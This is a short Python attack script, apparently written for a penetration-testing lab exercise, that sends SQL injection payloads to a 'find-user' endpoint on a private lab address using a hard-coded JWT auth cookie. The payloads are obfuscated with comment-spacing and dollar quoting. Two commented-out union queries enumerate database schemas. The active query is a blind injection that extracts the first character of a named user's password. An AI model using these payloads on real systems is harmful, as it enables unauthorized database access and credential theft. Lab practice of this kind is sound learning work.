#!/usr/bin/python3


"""This script going to be used
to try to enumerate the user information
with previous skills granted in the previous module
"""
from urllib.parse import (
    quote,
    unquote
)
import requests
import sys


def dicker():
	pass


def make_request():
    
    # here I'm going to use a lot of possible payload to get all information
    # key_payload = quote("'/**/union/**/select/**/$$1$$,$$2$$,$$3$$,$$4$$,$$schema_name$$,$$6$$/**/from/**/information_schema.schemata--")
    # key_payload = quote("'/**/union/**/select/**/$$1$$,$$2$$,$$3$$,$$4$$,$$catalog_name$$,$$6$$/**/from/**/information_schema.schemata--")
    key_payload = quote("'/**/AND/**/id=(SELECT/**/ASCII(SUBSTRING(password,1,1))/**/FROM/**/users/**/WHERE/**/username=$$itsmaria$$)--")
    cookies = {"auth":"eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJkaWNrZXIiLCJpYXQiOjE2ODMyMTU5OTUsImV4cCI6MTY4MzIyNDYzNX0.e9rWCQQfThf9sQEotn2PkMOyMDzE4EmlkV7f2oHNUitPDN7fV3IXi_1WUf1y5hQ4u-AlzAea81pGtw_0vZLZBg"}
    req = requests.get(url="http://10.129.204.249:8080/find-user?u="+key_payload, cookies=cookies)
    print(req.text)
    print(req.url)


def main():
    try:
        make_request()
        
    except Exception as e:
        print(str(e))
        sys.exit(1)

    except KeyboardInterrupt:
        print("Exiting...")
        sys.exit(0)



if __name__ == "__main__":
    main()
